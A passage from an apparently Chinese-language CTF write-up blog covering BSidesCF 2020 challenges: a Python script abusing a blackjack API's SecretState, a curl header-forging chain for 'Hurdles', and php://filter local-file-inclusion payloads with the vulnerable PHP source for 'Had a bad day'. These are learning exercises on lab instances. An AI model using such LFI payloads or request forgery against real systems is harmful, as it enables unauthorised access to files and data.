</span></span></code></pre></td></tr></table></div></div><p>其他的<code>js</code>去<code>GitHub</code>找吧，太多了</p><p><img src=/p/bsidescf2020/QQ20240821-195824.png width=1027 height=760 srcset="/p/bsidescf2020/QQ20240821-195824_hu_7dd43aa9d7da5d03.png 480w, /p/bsidescf2020/QQ20240821-195824_hu_810326ec120784e6.png 1024w" loading=lazy alt=环境图 class=gallery-image data-flex-grow=135 data-flex-basis=324px></p><p>环境搭建好应该是这样的</p><p>也就来回登录了七八遍吧,这个终端应该是那种只能用大键盘的，如果用小键盘输入的话不行，数字也必须用大键盘的</p><p><img src=/p/bsidescf2020/QQ20240821-201210.png width=885 height=608 srcset="/p/bsidescf2020/QQ20240821-201210_hu_1a15e228c4056c5a.png 480w, /p/bsidescf2020/QQ20240821-201210_hu_2dabf330b7a961f7.png 1024w" loading=lazy alt=登录成功 class=gallery-image data-flex-grow=145 data-flex-basis=349px></p><p>欧克那么这道流量题也是过了，我之前是一道流量都不会看的也是了解了一下</p><h1 id=bsidescf-2020cards>[BSidesCF 2020]Cards</h1><p>是一个赌博系统</p><p>抓包发现是由接口来判定操作的比如</p><p><code>/api/deal</code>,<code>/api/stand</code></p><p>观察包里面的<code>SecretState</code>是不一样的而且是随机的</p><p>长度也有点不一样</p><p>但是逐渐的抓包发现如果我们输了，这个<code>SecretState</code>是不会变的，但是赢了就会更新，那么下注之后要开牌的话，必须得用新的<code>SecretState</code>,但是下注之后分数已经扣了，可还是有输的状态</p><blockquote><p>利用21点中的一个规则，如果前两张牌已经是21点(black jack)，那么直接赢,直接省去开牌一直赢</p></blockquote><p>借用Y4师傅的脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>start</span> <span class=o>=</span> <span class=s2>&#34;http://f264fbfb-3b13-40b5-bce5-69afd17df237.node5.buuoj.cn:81/api&#34;</span>
</span></span><span class=line><span class=cl><span class=n>deal</span> <span class=o>=</span> <span class=n>start</span> <span class=o>+</span> <span class=s2>&#34;/deal&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 开局</span>
</span></span><span class=line><span class=cl><span class=n>state</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>start</span><span class=p>)</span><span class=o>.</span><span class=n>json</span><span class=p>()[</span><span class=s2>&#34;SecretState&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 下注</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>resp</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>deal</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;Bet&#34;</span><span class=p>:</span> <span class=mi>500</span><span class=p>,</span> <span class=s2>&#34;SecretState&#34;</span><span class=p>:</span> <span class=n>state</span><span class=p>})</span><span class=o>.</span><span class=n>json</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>resp</span><span class=p>[</span><span class=s1>&#39;GameState&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;Blackjack&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>state</span> <span class=o>=</span> <span class=n>resp</span><span class=p>[</span><span class=s1>&#39;SecretState&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>resp</span><span class=p>[</span><span class=s1>&#39;Balance&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>resp</span><span class=p>[</span><span class=s1>&#39;Balance&#39;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>100000</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>resp</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><h1 id=bsidescf-2020hurdles>[BSidesCF 2020]Hurdles</h1><p>考察<code>curl</code>的使用吧</p><ul><li><code>%2500</code>进行URL解码之后就是<code>%00</code>。</li><li>curl工具使用<code>-u</code>参数进行基本验证。</li><li>curl工具中使用<code>-A</code>参数指定浏览器。</li><li>curl工具中使用<code>-H</code>参数增加请求头。</li><li>curl工具中使用<code>-b</code>参数添加Cookie。</li><li>请求头中，<code>Origin</code>指明当前请求来自于哪个站点。</li><li>curl工具中使用<code>-i</code>参数显示响应头信息。</li></ul><p>挨着打就行了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT http://node5.buuoj.cn:25762/hurdles
</span></span><span class=line><span class=cl>I<span class=s1>&#39;m sorry, Your path would be more exciting if it ended in !
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>root@dkcjbRCL8kgaNGz:~# curl -X PUT http://node5.buuoj.cn:25762/hurdles/!
</span></span></span><span class=line><span class=cl><span class=s1>I&#39;</span>m sorry, Your URL did not ask to <span class=sb>`</span>get<span class=sb>`</span> the <span class=sb>`</span>flag<span class=sb>`</span> in its query string.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:25762/hurdles/!?get=flag&#39;</span>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;m sorry, I was looking for a parameter named &amp;=&amp;=&amp;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>root@dkcjbRCL8kgaNGz:~# curl -X PUT &#39;</span>http://node5.buuoj.cn:25762/hurdles/!?get<span class=o>=</span>flag<span class=p>&amp;</span>%26%3D%26%3D%26<span class=o>=</span>1<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>I&#39;</span>m sorry, I expected <span class=s1>&#39;&amp;=&amp;=&amp;&#39;</span> to equal <span class=s1>&#39;%00
</span></span></span><span class=line><span class=cl><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl>这里他想要一个%00也就是换行,但是如果要生效的话必须还得是后面再来个换行
</span></span><span class=line><span class=cl>curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:25762/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:25762/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;m sorry, Basically, I was expecting the username player.
</span></span></span><span class=line><span class=cl><span class=s1>由于不知道值是多少只能这么传
</span></span></span><span class=line><span class=cl><span class=s1>curl -X PUT &#39;</span>http://node5.buuoj.cn:25762/hurdles/!?get<span class=o>=</span>flag<span class=p>&amp;</span>%26%3D%26%3D%26<span class=o>=</span>%2500%0a<span class=s1>&#39; -u &#39;</span>player:player<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>root@dkcjbRCL8kgaNGz:~# curl -X PUT &#39;</span>http://node5.buuoj.cn:28548/hurdles/!?get<span class=o>=</span>flag<span class=p>&amp;</span>%26%3D%26%3D%26<span class=o>=</span>%2500%0a<span class=s1>&#39; -u &#39;</span>player:player<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>I&#39;</span>m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string <span class=s1>&#39;open sesame&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span> -u <span class=s1>&#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;m sorry, I was expecting you to be using a 1337 Browser.
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>root@dkcjbRCL8kgaNGz:~# curl -X PUT &#39;</span>http://node5.buuoj.cn:28548/hurdles/!?get<span class=o>=</span>flag<span class=p>&amp;</span>%26%3D%26%3D%26<span class=o>=</span>%2500%0a<span class=s1>&#39; -u &#39;</span>player:54ef36ec71201fdf9d1423fd26f97f6b<span class=s1>&#39; -A &#39;</span><span class=m>1337</span> Browser<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>I&#39;</span>m sorry, I was expecting your browser version <span class=o>(</span>v.XXXX<span class=o>)</span> to be over 9000!
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span> -u <span class=s1>&#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span> -A <span class=s1>&#39;1337 Browser v.9001&#39;</span>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;m sorry, I was eXpecting this to be Forwarded-For someone!
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>root@dkcjbRCL8kgaNGz:~# curl -X PUT &#39;</span>http://node5.buuoj.cn:28548/hurdles/!?get<span class=o>=</span>flag<span class=p>&amp;</span>%26%3D%26%3D%26<span class=o>=</span>%2500%0a<span class=s1>&#39; -u &#39;</span>player:54ef36ec71201fdf9d1423fd26f97f6b<span class=s1>&#39; -A &#39;</span><span class=m>1337</span> Browser v.9001<span class=s1>&#39; -H &#39;</span>X-Forwarded-For:192.168.128.130,127.0.0.1<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>I&#39;</span>m sorry, I was expecting the forwarding client to be 13.37.13.37
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span> -u <span class=s1>&#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span> -A <span class=s1>&#39;1337 Browser v.9001&#39;</span> -H <span class=s1>&#39;X-Forwarded-For:192.168.128.130,13.37.13.37&#39;</span>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;m sorry, I was expecting this to be forwarded through 127.0.0.1
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>root@dkcjbRCL8kgaNGz:~# curl -X PUT &#39;</span>http://node5.buuoj.cn:28548/hurdles/!?get<span class=o>=</span>flag<span class=p>&amp;</span>%26%3D%26%3D%26<span class=o>=</span>%2500%0a<span class=s1>&#39; -u &#39;</span>player:54ef36ec71201fdf9d1423fd26f97f6b<span class=s1>&#39; -A &#39;</span><span class=m>1337</span> Browser v.9001<span class=s1>&#39; -H &#39;</span>X-Forwarded-For:13.37.13.37,127.0.0.1<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>I&#39;</span>m sorry, I was expecting a Fortune Cookie
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span> -u <span class=s1>&#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span> -A <span class=s1>&#39;1337 Browser v.9001&#39;</span> -H <span class=s1>&#39;X-Forwarded-For:13.37.13.37,127.0.0.1&#39;</span> -b <span class=s1>&#39;Fortune=1&#39;</span>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;m sorry, I was expecting the cookie to contain the number of the HTTP Cookie (State Management Mechanism) RFC from 2011.
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>root@dkcjbRCL8kgaNGz:~# curl -X PUT &#39;</span>http://node5.buuoj.cn:28548/hurdles/!?get<span class=o>=</span>flag<span class=p>&amp;</span>%26%3D%26%3D%26<span class=o>=</span>%2500%0a<span class=s1>&#39; -u &#39;</span>player:54ef36ec71201fdf9d1423fd26f97f6b<span class=s1>&#39; -A &#39;</span><span class=m>1337</span> Browser v.9001<span class=s1>&#39; -H &#39;</span>X-Forwarded-For:13.37.13.37,127.0.0.1<span class=s1>&#39; -b &#39;</span><span class=nv>Fortune</span><span class=o>=</span>6265<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>I&#39;</span>m sorry, I expect you to accept only plain text media <span class=o>(</span>MIME<span class=o>)</span> type.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span> -u <span class=s1>&#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span> -A <span class=s1>&#39;1337 Browser v.9001&#39;</span> -H <span class=s1>&#39;X-Forwarded-For:13.37.13.37,127.0.0.1&#39;</span> -b <span class=s1>&#39;Fortune=6265&#39;</span> -H <span class=s1>&#39;Accept:text/plain&#39;</span>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;m sorry, Я ожидал, что вы говорите по-русски.
</span></span></span><span class=line><span class=cl><span class=s1>说俄语
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>root@dkcjbRCL8kgaNGz:~# curl -X PUT &#39;</span>http://node5.buuoj.cn:28548/hurdles/!?get<span class=o>=</span>flag<span class=p>&amp;</span>%26%3D%26%3D%26<span class=o>=</span>%2500%0a<span class=s1>&#39; -u &#39;</span>player:54ef36ec71201fdf9d1423fd26f97f6b<span class=s1>&#39; -A &#39;</span><span class=m>1337</span> Browser v.9001<span class=s1>&#39; -H &#39;</span>X-Forwarded-For:13.37.13.37,127.0.0.1<span class=s1>&#39; -b &#39;</span><span class=nv>Fortune</span><span class=o>=</span>6265<span class=s1>&#39; -H &#39;</span>Accept:text/plain<span class=s1>&#39; -H &#39;</span>Accept-Language:ru<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>I&#39;</span>m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span> -u <span class=s1>&#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span> -A <span class=s1>&#39;1337 Browser v.9001&#39;</span> -H <span class=s1>&#39;X-Forwarded-For:13.37.13.37,127.0.0.1&#39;</span> -b <span class=s1>&#39;Fortune=6265&#39;</span> -H <span class=s1>&#39;Accept:text/plain&#39;</span> -H <span class=s1>&#39;Accept-Language:ru&#39;</span> -H <span class=s1>&#39;origin:https://ctf.bsidessf.net&#39;</span>
</span></span><span class=line><span class=cl>I<span class=s1>&#39;m sorry, I was expecting you would be refered by https://ctf.bsidessf.net/challenges?
</span></span></span><span class=line><span class=cl><span class=s1>
</span></span></span><span class=line><span class=cl><span class=s1>root@dkcjbRCL8kgaNGz:~# curl -X PUT &#39;</span>http://node5.buuoj.cn:28548/hurdles/!?get<span class=o>=</span>flag<span class=p>&amp;</span>%26%3D%26%3D%26<span class=o>=</span>%2500%0a<span class=s1>&#39; -u &#39;</span>player:54ef36ec71201fdf9d1423fd26f97f6b<span class=s1>&#39; -A &#39;</span><span class=m>1337</span> Browser v.9001<span class=s1>&#39; -H &#39;</span>X-Forwarded-For:13.37.13.37,127.0.0.1<span class=s1>&#39; -b &#39;</span><span class=nv>Fortune</span><span class=o>=</span>6265<span class=s1>&#39; -H &#39;</span>Accept:text/plain<span class=s1>&#39; -H &#39;</span>Accept-Language:ru<span class=s1>&#39; -H &#39;</span>origin:https://ctf.bsidessf.net/challenges<span class=s1>&#39;
</span></span></span><span class=line><span class=cl><span class=s1>I&#39;</span>m sorry, I was expecting to share resources with the origin https://ctf.bsidessf.net
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -X PUT <span class=s1>&#39;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span> -u <span class=s1>&#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span> -A <span class=s1>&#39;1337 Browser v.9001&#39;</span> -H <span class=s1>&#39;X-Forwarded-For:13.37.13.37,127.0.0.1&#39;</span> -b <span class=s1>&#39;Fortune=6265&#39;</span> -H <span class=s1>&#39;Accept:text/plain&#39;</span> -H <span class=s1>&#39;Accept-Language:ru&#39;</span> -H <span class=s1>&#39;origin:https://ctf.bsidessf.net&#39;</span> -H <span class=s1>&#39;Referer:https://ctf.bsidessf.net/challenges&#39;</span>
</span></span><span class=line><span class=cl>Congratulations!
</span></span><span class=line><span class=cl>但是没有得到flag,估计在返回头里面
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>root@dkcjbRCL8kgaNGz:~# curl -i -X PUT <span class=s1>&#39;http://node5.buuoj.cn:28548/hurdles/!?get=flag&amp;%26%3D%26%3D%26=%2500%0a&#39;</span> -u <span class=s1>&#39;player:54ef36ec71201fdf9d1423fd26f97f6b&#39;</span> -A <span class=s1>&#39;1337 Browser v.9001&#39;</span> -H <span class=s1>&#39;X-Forwarded-For:13.37.13.37,127.0.0.1&#39;</span> -b <span class=s1>&#39;Fortune=6265&#39;</span> -H <span class=s1>&#39;Accept:text/plain&#39;</span> -H <span class=s1>&#39;Accept-Language:ru&#39;</span> -H <span class=s1>&#39;origin:https://ctf.bsidessf.net&#39;</span> -H <span class=s1>&#39;Referer:https://ctf.bsidessf.net/challenges&#39;</span>
</span></span><span class=line><span class=cl>HTTP/1.1 <span class=m>200</span> OK
</span></span><span class=line><span class=cl>X-Ctf-Flag: flag<span class=o>{</span>552ea2bc-52e9-4083-8fc0-66d6439b377b<span class=o>}</span>
</span></span><span class=line><span class=cl>Date: Wed, <span class=m>21</span> Aug <span class=m>2024</span> 14:26:45 GMT
</span></span><span class=line><span class=cl>Content-Length: <span class=m>16</span>
</span></span><span class=line><span class=cl>Content-Type: text/plain<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>utf-8
</span></span></code></pre></td></tr></table></div></div><h1 id=bsidescf-2020had-a-bad-day>[BSidesCF 2020]Had a bad day</h1><p>很简单一个题，直接秒了</p><p>观察<code>url</code>发现可以文件包含</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php?category=php://filter/convert.base64-encode/resource=index
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>				<span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;category&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>				<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$file</span><span class=p>))</span>
</span></span><span class=line><span class=cl>				<span class=p>{</span>
</span></span><span class=line><span class=cl>					<span class=k>if</span><span class=p>(</span> <span class=nx>strpos</span><span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=s2>&#34;woofers&#34;</span> <span class=p>)</span> <span class=o>!==</span>  <span class=k>false</span> <span class=o>||</span> <span class=nx>strpos</span><span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=s2>&#34;meowers&#34;</span> <span class=p>)</span> <span class=o>!==</span>  <span class=k>false</span> <span class=o>||</span> <span class=nx>strpos</span><span class=p>(</span> <span class=nv>$file</span><span class=p>,</span> <span class=s2>&#34;index&#34;</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>						<span class=k>include</span> <span class=p>(</span><span class=nv>$file</span> <span class=o>.</span> <span class=s1>&#39;.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>					<span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>						<span class=k>echo</span> <span class=s2>&#34;Sorry, we currently only support woofers and meowers.&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>					<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=p>}</span>
</span></span><span class=line><span class=cl>				<span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>嵌套一下就绕过了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php?category=php://filter/convert.base64-encode/index/resource=flag
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/index.php?category=php://filter/index/convert.base64-encode/resource=flag
</span></span></code></pre></td></tr></table></div></div><p>就拿到了，测试一下不能带<code>php</code>也是很容易就测出来的，所以<code>index.php</code>也很容易拿到</p></section><footer class=article-footer><section class=article-tags><a href=/tags/php/>Php</a>
<a href=/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/>流量分析</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/dasctf-2022-su/><div class=article-details><h2 class=article-title>DASCTF2022 SU春季赛</h2></div></a></article><article><a href=/p/newstarctf-2023-public-track/><div class=article-details><h2 class=article-title>NewStarCTF 2023 公开赛道</h2></div></a></article><article><a href=/p/dest0g3-520-welcome-match/><div class=article-details><h2 class=article-title>Dest0g3 520迎新赛</h2></div></a></article><article><a href=/p/wustctf2020/><div class=article-details><h2 class=article-title>WUSTCTF2020</h2></div></a></article><article><a href=/p/gwctf2019/><div class=article-details><h2 class=article-title>GWCTF2019</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
2025 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.30.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>